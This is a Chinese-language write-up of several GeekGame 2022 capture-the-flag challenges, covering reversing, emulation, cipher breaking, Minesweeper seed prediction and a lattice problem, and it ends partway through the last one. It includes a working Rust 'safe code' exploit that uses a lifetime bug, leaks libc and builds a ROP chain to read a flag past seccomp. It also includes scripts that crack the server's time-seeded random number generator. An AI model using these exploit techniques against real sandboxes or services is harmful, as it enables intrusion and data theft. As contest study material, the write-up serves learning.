0x4b+5:	jmp	0xffffffff9dd1bbb6
0x50+5:	jmp	0x56
0x55+5:	jmp	0xffffffff90dbf7a2
0x5a+5:	jmp	0x60
0x5f+5:	jmp	0xffffffff909090b7
0x64+5:	jmp	0x6a
0x69+5:	jmp	0xffffffff909090c2
0x6e+5:	jmp	0x74
0x73+5:	jmp	0xffffffff909090d7
0x78+5:	jmp	0x7e
0x7d+5:	jmp	0xffffffff9090911b
0x82+5:	jmp	0x88
0x87+5:	jmp	0xffffffff909090de
0x8c+5:	jmp	0x92
0x91+5:	jmp	0xffffffff909090ed
0x96+5:	jmp	0x9c
0x9b+5:	jmp	0xffffffff909090f4
0xa0+5:	jmp	0xa6
0xa5+5:	jmp	0xffffffff90909108
0xaa+5:	jmp	0xb0
0xaf+5:	jmp	0xffffffff90903c64
0xb4+5:	jmp	0xba
0xb9+5:	jmp	0xffffffff909005cd
```

不知道切换模式的做法能不能做出来。

补充：后来跟 xmcp 交流时他告诉我通过 mov 指令来进行自修改也可以解。我思考的时候确实想到这条路了，但是潜意识告诉我 mmap 的地址是随机的，没法知道往哪里 mov。看来我还是对 x86-64 的指令集不够熟悉，并且应该多想想的。如果这题出成两问，要求用不同的指令，应该还挺好玩的。

## TTOWRSS

这题挺有意思的。

上来用 `strace`、`ltrace` 看看程序做了些啥，发现被 SIGTRAP 刷屏了。

用 IDA 打开，找到成功和失败的字符串，看看使用字符串的地方，发现没有被识别成函数，并且附近的指令跳转很奇怪。

在 IDA 里面看一遍可以成功反编译的函数，发现一个注册信号处理函数的逻辑，处理信号的函数伪代码如下：

```c++
start = base + 0x1098
offset = (rip - start) >> 3
if bitof(table[offset / 8], offset % 8) == 1 {
    for(p = rip - 1, sum = 0, p2 = rip - 1 - start; sum != 2; p--, p2--) {
        sum += (table[p2 / 8] >> (p2 % 8)) & 1
    }
    rip = p
}
```

就是说，查一个表，这个表是按 bit 来索引地址的，如果表里面当前的 RIP 对应那个 bit 为 1，就向上找两次为 1 的 bit，并且把 RIP 设置过去。

那问题是，SIGTRAP 是怎么产生的呢？

在设置信号处理函数之后，程序把 eflags 寄存器的 0x100 这个位改成了 1，搜索可以知道这个位指的是 Trap flag (single step)，打开它程序就会单步执行，也就是说每执行一条指令都会触发 SIGTRAP。

然后我把那个指令的索引表打了出来：

```python
table = ...
for i in range(len(table) * 8):
    if (table[i//8]>>(i % 8)) & 1:
        print(hex(i + 0x1098))
```

对照反汇编的结果看，正好就是每条指令的起始字节！一共分为两部分，正是 IDA 没能识别成函数的两段。

每条指令要执行的时候，就跳转到上上条指令，这是什么意思呢？就是把所有指令反过来执行嘛。

于是我写了一段代码来把指令顺序翻过来，指望可以用 IDA 的反编译功能，但是发现翻过来之后偏移量又都不对了。如果手工修偏移量的话，还不如直接倒着看指令来逆向呢。

于是我就开始人工看判断 flag 正确性部分的逻辑，伪代码大概这样：

```python
rcx: i
table: 32 bit
table2: 8 bit
table3: 16 bit

i = 0
while True:
    rsi = r11d = table[i]
    edx = table2[rsi] ^ rsi
    if table3[edx] & 0x7f != flag[i]:
        break
```

按这个算一下 flag 就出来了。

这里的逻辑是从常数数组来生成 flag，然后判断每一位，而不是根据 flag 进行计算然后跟常数比较，并且是比较失败就立即退出的而不是定长的比较。既然这样，那其实我最开始就可以直接把这个程序当黑箱，穷举 flag 的每一个字符，通过 strace 出来的 SIGTRAP 次数来做侧信道把 flag 探测出来。即使没有 SIGTRAP，应该也可以用指令计数或者分支计数的方法来探测。甚至，还可以记录每个 cmp 指令判断过的数字来从里面筛选 flag。下次遇到这种题可以先当黑箱用侧信道试试，说不定直接就做出来了。

## 次世代立方计算机

这题阅读代码，可以看出来是实现了一个 CPU，它的 ROM 是三维的，跳转指令可以把执行的方向改到任意一个坐标轴的任意方向。

这个 CPU 的数据位宽是 6，也就是说所有数据都是 0 ~ 63，我一开始看到 Cube64 的名字还以为它会是一个 64 位计算机，原来是另一种 64 啊。

用 Python 把 ROM 中的指令读出来，可以把指令的内容都显示出来，也很容易写出来一个模拟器来执行 ROM 的内容。

```python
def direction(x):
    return ['x+', 'x-', 'y+', 'y-', 'z+', 'z-'][x]

def decode(x):
    if 0 <= x <= 19:
        return ['nop', 'dup', 'swap', 'ld', 'st', 'out', 'halt', 'inc', 'add', 'sub', 'and', 'or', 'not', 'xor', 'shl', 'shr', 'sar', 'lt', 'ltu', 'eq'][x]
    elif 32 <= x < 40:
        return f'bt({direction(x - 32)})'
    elif 40 <= x < 48:
        return f'bf({direction(x - 40)})'
    elif 48 <= x < 56:
        return f'j({direction(x - 48)})'
    elif 64 <= x < 128:
        return f'li({(x - 64)})'
    else:
        print('unknown', x)

romdata = open('../prob20-src/src/main/resources/rom.bin', 'rb').read()
for z in range(16):
    for y in range(16):
        for x in range(16):
            print(decode(romdata[z * 256 + y * 16 + x]), end='\t')
        print()
    print()
```

```python
stack = [0] * 32
sp = 0
def push(n):
    global sp
    stack[sp] = n
    sp += 1
def pop():
    global sp
    sp -= 1
    return stack[sp]
def setdir(n):
    global d
    d = n % 8
    print('setdir', n % 8, '-' * 50)
def printstack():
    print('stack:', stack[:sp])
rom = [[[0] * 16 for _ in range(16)] for _ in range(16)]
for i in range(16):
    for j in range(16):
        for k in range(16):
            rom[i][j][k] = romdata[i * 256 + j * 16 + k]
ram = [0] * 64
out = []
d = 0
x, y, z = 0, 0, 0
while True:
    # print('pc', x, y, z)
    ins = rom[z][y][x]
    if ins == 0:
        pass
    elif ins == 1:
        a = pop()
        push(a)
        push(a)
        print('dup')
        printstack()
    elif ins == 2:
        a = pop()
        b = pop()
        push(a)
        push(b)
        print('swap')
        printstack()
    elif ins == 3:
        addr = pop()
        data = ram[addr]
        print(f'ld {addr} -> {data}')
        push(data)
        printstack()
    elif ins == 4:
        addr = pop()
        data = pop()
        print(f'st {data} to {addr}')
        print('ram:', ram)
        ram[addr] = data
        printstack()
    elif ins == 5:
        data = pop()
        print('out:', data)
        out.append(data)
        printstack()
    elif ins == 6:
        print('halt')
        break
    elif ins == 7:
        print('inc')
        push((pop() + 1) % 64)
        printstack()
    elif ins == 8:
        a = pop()
        b = pop()
        ans = (b + a) % 64
        print(f"{b} + {a} = {ans}")
        push(ans)
    elif ins == 9:
        a = pop()
        b = pop()
        ans = (b - a) % 64
        push(f"{b} - {a} = {ans}")
    elif ins == 10:
        a = pop()
        b = pop()
        ans = (b & a) % 64
        push(ans)
        print(f"{b} & {a} = {ans}")
        printstack()
    elif ins == 11:
        a = pop()
        b = pop()
        push((b | a) % 64)
    elif ins == 12:
        a = pop()
        push((~a) % 64)
    elif ins == 13:
        a = pop()
        b = pop()
        ans = (b ^ a) % 64
        push(ans)
        print(f"{b} ^ {a} = {ans}")
        printstack()
    elif ins == 14:
        a = pop()
        b = pop()
        push((b << (a % 8)) % 64)
    elif ins == 15:
        a = pop()
        b = pop()
        push((b >> (a % 8)) % 64)
    elif ins == 16:
        a = pop()
        b = pop()
        if b >= 32:
            b -= 32
        push((b >> (a % 8)) % 64)
    elif ins == 17:
        a = pop()
        b = pop()
        if b >= 32:
            b -= 32
        push(int(b < a))
    elif ins == 18:
        a = pop()
        b = pop()
        push(int(b < a))
    elif ins == 19:
        a = pop()
        b = pop()
        if b >= 32:
            b -= 32
        push(int(b == a))
    elif 32 <= ins < 40:
        if pop() != 0:
            setdir(ins - 32)
    elif 40 <= ins < 48:
        if pop() == 0:
            setdir(ins - 40)
    elif 48 <= ins < 56:
        setdir(ins - 48)
    elif 64 <= ins < 128:
        push(ins - 64)
        print('li', ins - 64)
        printstack()
    else:
        print('error')
        break
    if d == 0:
        x += 1
    elif d == 1:
        x -= 1
    elif d == 2:
        y += 1
    elif d == 3:
        y -= 1
    elif d == 4:
        z += 1
    elif d == 5:
        z -= 1
    else:
        print('error dir')
        break
print('ram:', ram)
print('out:', len(out), out)
```

ROM 的程序逻辑就是读写 RAM 算一通，最后输出出来一堆 0 ~ 63 的数。

所以，flag 在哪儿？再问一遍，flag 在哪儿？？？

然后我就开始研究那个 jar 文件，毕竟给了源代码和 jar，肯定是有意义的。研究了很久发现 jar 跟源代码似乎没什么区别，逻辑是一样的，ROM 也一样。

因为测试代码里面写了这个 ROM 运行后预期会输出 flag，而实际的输出是 0 ~ 63 的数，结合题目描述加粗的「编码手段」字样，我猜测这个输出是 base64，但是其实这里有两种理解：一种理解是，0 ~ 63 对应 base64 编码里面的 64 个字符，然后直接就是 flag。另一种理解是，这个 base64 解码之后才是 flag。

试了一下，都是乱码，然后呢？flag 在哪儿？？？

然后我开始思考，是不是初始的时候栈上或者 RAM 中有什么数据？对应 ROM 中指令的逻辑可以发现，栈上提前有东西是不会被用到的，RAM 中只有前 4 个数会被用到，那就穷举一下前 4 个数看看吧。

用 Python 对我上面说的两种对 base64 的理解和所有可能的 RAM 初始情况穷举了一下，假设输出是以 flag 开头，于是成功跑出来了 flag。

我做出来之后题目放出了提示：

> Cube64 计算机某些内部状态的初始值可能会影响其输出。
> Cube64 输出的内容使用 base64 解码后即可得到 Flag。

直接把这道题变简单了很多，如果早点有这个提示我就不用浪费这么多时间了。另外，题目如果说清楚 jar 和源代码是相同的，我就不用花力气逆向 jar 了。

这道题是本届比赛做题体验最差的一道题。

哪里有代打出题人服务？

## 混淆器（未解出）

研究了一段时间不会做，并且没有时间继续研究了。

## 编原译理习题课 · 实验班

这道题看上去可以用编译期间命令执行来搞一个非预期解，但是我花了不少时间却没搞出来。如果能够编译期间命令执行，就可以产生一个子进程，两次 fork 来脱离父进程，然后等着 flag 被复制进根目录。Rust 编译期间是[能执行任意命令的](https://github.com/de-vri-es/rust-compile-time-run)，但是题目不允许修改 `Cargo.toml`，我就不知道怎么搞了。如果换作其他语言，只要库能做到，一般直接写代码没有理由做不到。不知道有没有人能通过这条路解出来题。

然后我就正常解题了，Google 搜索「ctf rust crash safe code」，第一个就是[一个非常相似的 CTF 题解](https://github.com/yoava333/ctf-writeups/blob/master/googlectf_quals/2019/sandstone/README.md)，最后的代码直接提交上去就能过第一问。

第二问也非常清晰，seccomp 只允许 read 和 write，而 flag 文件已经被打开，所以我们只需要从 3 号 fd 里面读 flag 再写入 stdout 或者 stderr 就行了。上面这篇文章的解题代码是用 ROP 的方式实现了 1337 这个 syscall，我们很容易把它改成 read 加上 write。

首先我们的 libc 版本跟这篇文章不一样，其次栈的布局也不太一样，不过很容易重新算出来需要的偏移，只需要在 rust 代码里面把栈的内容都打印出来，找到在 libc 范围内的地址，然后减去基址就行了。然后是改 ROP，用 ROPGadget 找一下，然后拼出来两次 syscall 需要的指令就行。

我很久没做这类题目了，所以在配置 gdb 和 pwndbg 上面花了不少时间，尤其是这个题目的 Docker 环境，只要一安装 gdb，libc 就会被带着升级，把我坑了几次。

最终的 payload：

```rust
#![forbid(unsafe_code)]

use std::io;
use std::io::prelude::*;

trait A {
    fn my_func(&self) -> &mut [u64];
}

struct B {
    b: u64,
}
struct C {
    c: u64,
}

impl A for B {
    fn my_func(&self) -> &mut [u64] {
        get_dangling()
    }
}

impl A for C {
    fn my_func(&self) -> &mut [u64] {
        get_dangling()
    }
}

fn is_prime(a: u64) -> bool {
    if a < 2 {
        return false;
    }
    if a % 2 == 0 {
        return true;
    }
    for i in 3..a {
        if a % i == 0 {
            return false;
        }
    }
    true
}

fn get_trait_a() -> Box<dyn A> {
    let n = if let Ok(args) = std::env::var("CARGO_EXTRA_ARGS") {
        args.len() as usize
    } else {
        791913
    };

    if is_prime(n as u64) {
        Box::new(B { b: 0 })
    } else {
        Box::new(C { c: 0 })
    }
}

trait Object {
    type Output;
}

impl<T: ?Sized> Object for T {
    type Output = &'static mut [u64];
}

fn foo<'a, T: ?Sized>(x: <T as Object>::Output) -> &'a mut [u64] {
    x
}

fn transmute_lifetime<'a, 'b>(x: &'a mut [u64]) -> &'b mut [u64] {
    foo::<dyn Object<Output = &'a mut [u64]>>(x)
}

// And yes this is a genuine `transmute_lifetime`
fn get_dangling<'a>() -> &'a mut [u64] {
    io::stdout().write(b"hello\n");
    let mut a: [u64; 128] = [0; 128];
    let mut x = 0;
    transmute_lifetime(&mut a)
}

// This function is only used to raise the stack frame and allow the dangling
// slice to overwrite the stack frame of low stack frames.
fn rec(a: &mut [u64], b: &mut [u64], attack: &mut [u64], n: u64, lib_c: u64, wpos: u64) {
    let mut array: [u64; 3] = [0; 3];
    a[0] += 1;
    b[0] += 1;

    array[0] = a[0] + 1;
    array[1] = a[0] + b[1] + 1;

    if a[0] > n {

        /*

        pop rsi // pointer
        pop rdx // 100
        pop rdi // 3
        pop rax // 0
        syscall

        pop rdi // 1
        pop rax // 1
        syscall

        */

        let pop_rax_ret = lib_c + 0x3a638 - 0x22000;
        let syscall_inst = lib_c + 0x24104 - 0x22000;
        let ret = lib_c + 0x2235f - 0x22000;
        let pop_rsi_ret = lib_c + 0x2440e - 0x22000;
        let pop_rdx_ret = lib_c + 0x106725 - 0x22000;
        let pop_rdi_ret = lib_c + 0x23a5f - 0x22000;
        let syscall_ret = lib_c + 0xb5b35 - 0x22000;

        // Overwrite the stack with ret slide
        for (j, el) in attack.iter_mut().enumerate() {
            *el = ret;
        }

        // Write our small rop chain
        let x = 50;
        // attack[x] = pop_rax_ret;
        // attack[x + 1] = 0x1337;
        // attack[x + 2] = syscall_inst;
        attack[x - 2] = pop_rsi_ret;
        attack[x - 1] = wpos;
        attack[x] = pop_rdx_ret;
        attack[x + 1] = 100;
        attack[x + 2] = pop_rdi_ret;
        attack[x + 3] = 3;
        attack[x + 4] = pop_rax_ret;
        attack[x + 5] = 0;
        attack[x + 6] = syscall_ret;
        attack[x + 7] = pop_rdi_ret;
        attack[x + 8] = 1;
        attack[x + 9] = pop_rax_ret;
        attack[x + 10] = 1;
        attack[x + 11] = syscall_ret;

        // Trigger
        return;
    }

    // Random calculation to kill compiler optimizations.
    if a[0] > 30 {
        b[0] = a[0] + a[1];
        rec(b, &mut array, attack, n, lib_c, wpos);
    } else {
        b[1] = a[2] + a[0];
        rec(&mut array, a, attack, n, lib_c, wpos);
    }
}

pub fn run() {

    // using external variables to kill compiler optimizations
    let n = if let Ok(args) = std::env::var("BLA") {
        args.len() as usize
    } else {
        30
    };

    // using external variables to kill compiler optimizations
    let n2 = if let Ok(args) = std::env::var("BLA") {
        10
    } else {
        100
    };

    // Using the dyn trait so that the compiler will execute the
    // get_dangling function in a higher stack frame.
    let my_a = get_trait_a();
    // getting the random stack
    let mut r = my_a.my_func();

    // Just random content
    let mut v: Vec<u64> = Vec::with_capacity(n);
    v.push(1);
    v.push(1);
    v.push(1);

    // Adding some content;
    let mut b: Vec<u64> = Vec::with_capacity(n);
    b.push(1);
    b.push(2);
    b.push(3);

    // We need to write output buffers to get lib-c gadgets
    println!("Give me gadegts\n");

    for i in 0..100 {
        println!("{} {:x}", i, r[i]);
    }

    let mut index = 0;
    for i in 0..100 {
        if (r[i] - 400768) % 0x1000 == 0 {
            index = i;
            break;
        }
    }

    let lib_c_addr = r[index];
    let lib_c = lib_c_addr - 400768;
    let wpos = r[24];

    println!("===============\nlib_c base = ");
    println!("{} {:x}", index, lib_c);
    println!("===============\n");

    // while(true){}

    // Exploit
    rec(&mut v, &mut b, r, n2, lib_c, wpos);

}

//EOF
```

## 381654729

搜索一下就行。

```python
cands = {0}
for r in range(1, 50):
    new_cands = set()
    for n in cands:
        for i in range(16):
            new = n * 16 + i
            if new % r == 0:
                new_cands.add(new)
    cands = new_cands
    print(r, len(cands))
    if len(cands) < 100:
        print(cands)
```

最长的数字有三个，都试一下：

```python
for x in 60753927368683934227793588395570842550542338031, 89515749136034833729775437005460258167590093634, 18872900738885736149574055538327802527212537551:
    print((x ^ 2511413510804014444370343823137062953062742910939341214015).to_bytes(100, 'big'))
```

就有 flag。

## 乱码还原

可以从原文的第一个字符开始往后搜索，对于每一个字符尝试所有情况，如果按照题目的方式编码之后是密文的前缀，就保留这种情况。试了一下因为有多解，组合数很快会爆炸，所以每解出来一个 AES 的块大小，都解密看一下结果是不是可见字符，这样可以尽快过滤掉错误的情况。

```python
from Crypto.Cipher import AES

KEY = b'XDXDtudou@KeyFansClub^_^Encode!!'
IV = b'Potato@Key@_@=_='

cip = open('flag2.enc').read()
TUDOU = [
    '滅', '苦', '婆', '娑', '耶', '陀', '跋', '多', '漫', '都', '殿', '悉', '夜', '爍', '帝', '吉',
    '利', '阿', '無', '南', '那', '怛', '喝', '羯', '勝', '摩', '伽', '謹', '波', '者', '穆', '僧',
    '室', '藝', '尼', '瑟', '地', '彌', '菩', '提', '蘇', '醯', '盧', '呼', '舍', '佛', '參', '沙',
    '伊', '隸', '麼', '遮', '闍', '度', '蒙', '孕', '薩', '夷', '迦', '他', '姪', '豆', '特', '逝',
    '朋', '輸', '楞', '栗', '寫', '數', '曳', '諦', '羅', '曰', '咒', '即', '密', '若', '般', '故',
    '不', '實', '真', '訶', '切', '一', '除', '能', '等', '是', '上', '明', '大', '神', '知', '三',
    '藐', '耨', '得', '依', '諸', '世', '槃', '涅', '竟', '究', '想', '夢', '倒', '顛', '離', '遠',
    '怖', '恐', '有', '礙', '心', '所', '以', '亦', '智', '道', '。', '集', '盡', '死', '老', '至']
tudous = {x:i for i, x in enumerate(TUDOU)}
BYTEMARK = ['冥', '奢', '梵', '呐', '俱', '哆', '怯', '諳', '罰', '侄', '缽', '皤']
bytemarks = {x:i for i, x in enumerate(BYTEMARK)}
charset = TUDOU + BYTEMARK + ['：']

def check(s):
    if len(s) < 3:
        return True
    if not s.startswith('佛曰：'):
        return False
    data = []
    i = 3
    while i < len(s):
        if s[i] in bytemarks:
            i = i + 1
            if i < len(s):
                if s[i] not in tudous:
                    return False
                data.append(tudous[s[i]] + 128)
        else:
            if s[i] not in tudous:
                return False
            data.append(tudous[s[i]])
        i = i + 1
    data = bytes(data[:len(data) // 16 * 16])
    cryptor = AES.new(KEY, AES.MODE_CBC, IV)
    result = cryptor.decrypt(data)
    for i in result[:-16]:
        if i >= 128:
            return False
    return True

cands = ['']
final = []
ln = 0
while cands:
    ncands = []
    for prefix in cands:
        for n in charset:
            new = prefix + n
            new_enc = new.encode("utf-8").decode("shift_jis",errors="ignore")
            if cip.startswith(new_enc) and check(new):
                if cip == new_enc:
                    print(new)
                    final.append(new)
                else:
                    ncands.append(new)
    cands = ncands
    ln += 1
    if ln % 100 == 0:
        print(ln, len(cands), len(cands[0].encode("utf-8").decode("shift_jis",errors="ignore")), len(cip))
```

对于第二问，最后需要解一堆编码，手工一层一层试一遍就行了。

不过最后的 flag 还带了一堆其他字符，flag 在一段长文本的中间。如果有人假设 flag2 文件里面只有 flag，利用 flag 的前缀来求解的话，这样岂不是会把人坑了。

## 奇怪的加密

这题我上来直接搜到了原文。

首先这个 `MkhCab20, Gqmfhmhx, PW4` 一看就是 ChaCha20 和 RC4，然后我们知道这个加密算法不会加密第一个字母，所以文章开头大概是 `Cryptography is a`，还有一些年份之类的数字，靠这些信息我去 Google 搜了一下，关键词是 `"chacha20" "rc4" 1970' "1863" cryptography "1974"` 直接搜到了一个 [PDF](https://www.lancaster.ac.uk/media/lancaster-university/content-assets/documents/cyber-foundry/Cryptography.pdf)，里面有原文，每个单词的字母数都可以对应上。

有明文就简单了，因为这整个置换是可以拆分成几个轮换的（可以自己生成几组 key 打印出来观察一下），所以我们可以知道很多字母对之间的间隔，这样就可以推导出更多字母之间的间隔，然后间隔为 1 收集起来的就是初始的 key。手工都可以做出来，但是比较麻烦，我直接写代码算了：

```python
p = 'Cryptography is a technique used to enable secure communication between different parties, it transforms data into another form so that only those who know how to transform the data back to the original can read it.'
c = 'Cinqwmzewtxs kn f kiepagkuf umpd op hsoert trsjbo lxmlurzyrzmke enpariq dtseeimrw areslyy, kp chlqwzwgme dnwg eosk ofapera xrne zo gynw mxyx exhbt aft fhir qox re wzroqyqpg per dpak ahcq re wtk pflmcmew zlq boqd ig.'
pn = [ord(i.upper()) - 65 for i in p if i.lower() in ascii_lowercase]
cn = [ord(i.upper()) - 65 for i in c if i.lower() in ascii_lowercase]

N = 100

dis = [[None] * 26 for _ in range(26)]
for i in range(1, len(pn)):
    dis[pn[i]][cn[i]] = i
    dis[cn[i]][pn[i]] = -i

def updatedis(i, j, d):
    return updatedis_(i, j, d) or updatedis_(j, i, -d)

def updatedis_(i, j, d):
    assert i != j and d != 0
    if dis[i][j] is None or (dis[i][j] * d > 0 and abs(dis[i][j]) > abs(d)) or (dis[i][j] < 0 and d > 0):
        dis[i][j] = d
        return True

def getdis(i, j):
    assert i != j
    return dis[i][j]

while True:
    stop = True
    for i in range(26):
        for j in range(26):
            if i != j:
                d1 = getdis(i, j)
                if d1 is not None:
                    for k in range(26):
                        if i != k and j != k:
                            d2 = getdis(j, k)
                            if d2 is not None:
                                if updatedis(i, k, d1 + d2):
                                    stop = False
                            d2 = getdis(k, j)
                            if d2 is not None:
                                if updatedis(i, k, d1 - d2):
                                    stop = False
    if stop:
        break

m = [[None] * 26 for _ in range(N)]
m[0] = list(range(26))
for i in range(26):
    for j in range(26):
        if i != j:
            d = getdis(i, j)
            if d is not None and d > 0:
                m[d][i] = j

for i in range(26):
    print(chr(65 + i), end='')
print()
for i in range(26):
    for j in range(26):
        if i != j:
            d = getdis(i, j)
            if d == 1:
                print(chr(65 + j), end='')
                break
    else:
        print('?', end='')
print()
print()

def show():
    for line in m:
        for i in line:
            if i is None:
                print(' ', end='')
            else:
                print(chr(65 + i), end='')
        print()

show()
```

有几个字母我的代码没处理好，手工补一下就行。

最后解密：

```python
txt0 = open('prob17/crypt1.txt').read()

letters='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
key =   'YNKDFMRAWUQPLTZCHIEGJVXOBS'
key=key.strip().upper()

keymap={letters[i]:key[i] for i in range(26)}
current_key={letters[i]:letters[i] for i in range(26)}
current_key_rev = {v:k for k, v in current_key.items()}

pt = ''
for i in txt0:
    if i not in letters and i not in letters.lower():
        pt=pt+i
    else:
        if i in letters:
            pt=pt+current_key_rev[i]
        else:
            pt=pt+current_key_rev[i.upper()].lower()
        current_key={i:keymap[current_key[i]] for i in current_key}
        current_key_rev = {v:k for k, v in current_key.items()}

print(pt)
```

解出来的明文里面搜索 flag，发现是无线电的那个编码规则，解码一下就行了，Hackergame 去年就[考了这个东西](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E5%8E%BB%E5%90%A7%EF%BC%81%E8%BF%BD%E5%AF%BB%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%B5%E6%B3%A2/README.md)。能不能不要把 Hackergame 的东西搬到 GeekGame。

第二问看起来像均匀分布的十六进制，于是我统计了一下字母和数字的比例，果然非常接近 6:10。然后看了一下，每个字母都有，并且按照位置 mod 26 的结果来分成 26 个组，每组里面都恰好有 6 种字母。对于每个字母来说，它根据初始 keymap 查到的下一个字母一定在下一个分组的 6 种字母里面，所以每个字母出现的时候就能用下一个字母的可能集合来缩小一下范围。这样就可以解出来唯一的可能性。

```python
txt0 = open('prob17/crypt2.txt').read()
txt = ''
for c in txt0:
    if c.lower() in ascii_lowercase:
        txt += c.lower()

poss = {}
for c in ascii_lowercase:
    poss[c] = set(ascii_lowercase)
last = 'abcdef'
for i in range(1, 26 + 1):
    s = set(txt[i::26])
    for c in last:
        poss[c] &= s
    last = s

for c in ascii_lowercase:
    print(''.join(sorted(poss[c])), end='')
```

可以得到 key。然后跟上一问一样解密，之后按照提示去搜索引擎搜索，发现每行都是单字母的 md5，所有字母连起来就是包含 flag 的文本。把单字母的都解出来之后发现还有双字母和更多字母的，不过两个字母的就已经足够还原 flag 了。

```python
from hashlib import md5
table = {}
t = b''
for c1 in range(256):
    for c2 in range(256):
        table[md5(bytes([c1, c2])).hexdigest()] = bytes([c1, c2])
    table[md5(bytes([c1])).hexdigest()] = bytes([c1])
for line in pt.splitlines():
    if line in table:
        t += table[line]
    else:
        print(line)
```

## 扫雷 II

为什么要在题目描述里面引用我去年 writeup 里的话？

随机数种子看起来是时间戳，单位是毫秒，前两问都直接穷举就行。

因为我一直在一份代码上面改的，前两问的代码没存，所以这里就不贴了，就是直接穷举种子，不难写。找到种子之后，生成下一个局面，然后把不是雷的地方都点一遍就行。

其中第二问需要多穷举安全随机数生成的一个字节的 256 种情况。我看到题目觉得这题需要把不安全的随机数的中间状态保存了，这样对于每个随机数种子就可以只迭代 20221119 + 255 次而不是 20221119 * 256 次。但是实际写起来直接单线程穷举 20221119 * 256 种情况也能一下子就跑出来。我本来想着可以写并行算法加速来着但是都没需要。

我看第二阶段提示说那个时间可能快于系统时间，但是我实际运行的时候，服务器的随机数种子跟我发送 reset 请求的返回时间，不会相差几毫秒。即使服务器这个时间真的不准确，你总是可以通过第一问来算出偏移量的对吧。

（所以为什么很多人很快做出来了第一问但是一直没能做出第二问？）

第三问稍微加了一点难度，棋盘最边缘的一圈是根据随机数种子确定性生成的，中间部分按照间隔的模式有一半是确定性生成的，另一半完全随机。在搜索种子的时候，我们可以通过周围的一圈来判断种子正确。（其实第一行就够了。）找到种子之后，可以知道地图上一部分答案，剩下的部分用正常的扫雷解法完成就可以。

我最开始懒着写自动扫雷程序，直接手工去点，结果手残失败了好几次，最后气得写了代码求解才过。

解题代码：

```go
package main

import (
	securerand "crypto/rand"
	"fmt"
	"math/rand"
	"os"
	"time"
)

type Board = [16]int

func checkBoard3(target Board) bool {
	// fmt.Fprintln(os.Stderr, "x", target[0])
	for i := 0; i < 16; i++ {
		for j := 0; j < 16; j++ {
			target[i] ^= ((rand.Intn(257)) % 2) << j
		}
	}
	return target[0] == 0 && target[15] == 0
}

func genBoard3mask() (board Board) {
	// fmt.Fprintln(os.Stderr, "x", board[0])
	for i := 0; i < 16; i++ {
		for j := 0; j < 16; j++ {
			board[i] ^= ((rand.Intn(257)) % 2) << j
		}
	}
	return
}

func main() {
	var seed int64
	seed = time.Now().UnixMilli()
	fmt.Fprintln(os.Stderr, "now", seed)
	fmt.Scanf("%d", &seed)
	var target Board
	for i := 0; i < 16; i++ {
		fmt.Scanf("%d", &target[i])
	}
	for {
		rand.Seed(seed)
		if checkBoard3(target) {
			board_predict := genBoard3mask()
			for i := 0; i < 16; i++ {
				fmt.Println(board_predict[i])
			}
			return
		}
		seed -= 1
		// fmt.Fprintln(os.Stderr, seed)
	}
}
```

```python
import requests

url = 'https://prob14-wfacr8m2.geekgame.pku.edu.cn/'

def reset():
    return requests.post(url + 'reset').json()

def board():
    return requests.get(url + 'board').json()

def init(level):
    return requests.post(url + 'init', data={'level': level}).json()

def click(x, y):
    print('click', x, y)
    return requests.post(url + 'click', data={'x': x, 'y': y}).json()

def board_to_nums(board):
    nums = []
    for i in range(16):
        n = 0
        for j in range(16):
            if board[i][j] == -1:
                n |= 1 << j
        nums.append(n)
    return nums

import subprocess
import time

def crack(t, nums):
    out = subprocess.check_output(['14solve/m'], input='\n'.join(str(x) for x in [t] + nums).encode(), timeout=10)
    return [int(x) for x in out.decode().splitlines()]

t = int(time.time() * 1000)
print(t)
reset()
t = int(time.time() * 1000)
print(t)
init(3)
i = 0
board = None
while True:
    c = click(i // 16, i % 16)
    if 'ok' not in c:
        board = c['boom']
        break
    i += 1
nextnums = crack(t + 1000, board_to_nums(board))
def nums_to_board(nums):
    board = []
    for i in range(16):
        line = []
        for j in range(16):
            line.append((nums[i] >> j) & 1)
        board.append(line)
    return board
maskboard = nums_to_board(nextnums)
for i in range(16):
    if 1 <= i < 15:
        if i % 2 == 0:
            m = 0x5554
        else:
            m = 0x2aaa
        for j in range(16):
            if (m >> j) & 1:
                maskboard[i][j] = None
for i in range(16):
    for j in range(16):
        if maskboard[i][j] == 0:
            print(click(i, j))
def reqboard():
    return requests.get(url + 'board').json()['board']
board = reqboard()
for i in range(16):
    for j in range(16):
        if maskboard[i][j] == 1:
            board[i][j] = -1
print(board)

def nearbomb(x, y):
    cnt = 0
    for i in -1, 0, 1:
        for j in -1, 0, 1:
            if (i, j) != (0, 0) and 0 <= x + i < 16 and 0 <= y + j < 16:
                if board[x + i][y + j] == -1:
                    cnt += 1
    return cnt

def nearcovered(x, y):
    cnt = 0
    for i in -1, 0, 1:
        for j in -1, 0, 1:
            if (i, j) != (0, 0) and 0 <= x + i < 16 and 0 <= y + j < 16:
                # print(x + i, y + j, board[x + i][y + j])
                if board[x + i][y + j] < 0:
                    cnt += 1
    return cnt

while True:
    last_board = [[x for x in l] for l in board]
    for i in range(16):
        for j in range(16):
            if board[i][j] > 0:
                if nearbomb(i, j) == board[i][j]:
                    for ii in -1, 0, 1:
                        for jj in -1, 0, 1:
                            if (i, j) != (0, 0) and 0 <= ii + i < 16 and 0 <= jj + j < 16:
                                if board[ii + i][jj + j] == -2:
                                    r = click(ii + i, jj + j)
                                    print(r)
                                    board[ii + i][jj + j] = r['ok']
                                    flag = True
            if board[i][j] > 0:
                if nearcovered(i, j) == board[i][j]:
                    for ii in -1, 0, 1:
                        for jj in -1, 0, 1:
                            if (i, j) != (0, 0) and 0 <= ii + i < 16 and 0 <= jj + j < 16:
                                if board[ii + i][jj + j] == -2:
                                    board[ii + i][jj + j] = -1
    if board == last_board:
        print('finished')
        break
```

## 方程组

第三问类似[子集和（0/1 背包）问题，用 LLL 可解](https://mathweb.ucsd.edu/~crypto/Projects/JenniferBakker/Math187/)，没啥说的，甚至之前有比赛的题目就是这题的 sqrt 改成 log 而已。

先把数据处理成大整数，这里都乘以 2 ^ 512 取整

```python
from decimal import *
primes=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271]
